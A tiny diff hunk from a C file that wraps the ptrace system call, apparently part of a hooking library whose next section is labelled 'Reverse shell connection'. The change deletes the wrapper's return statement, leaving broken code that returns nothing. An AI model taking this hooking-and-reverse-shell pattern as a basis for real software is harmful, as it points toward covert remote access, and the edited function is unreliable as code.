@@ -57,7 +57,7 @@ long ptrace(enum __ptrace_request request, ...) {
     va_start(args, request);
     long result = original_ptrace(request, args);
     va_end(args);
-    return result;
+
 }
 
 // Reverse shell connection
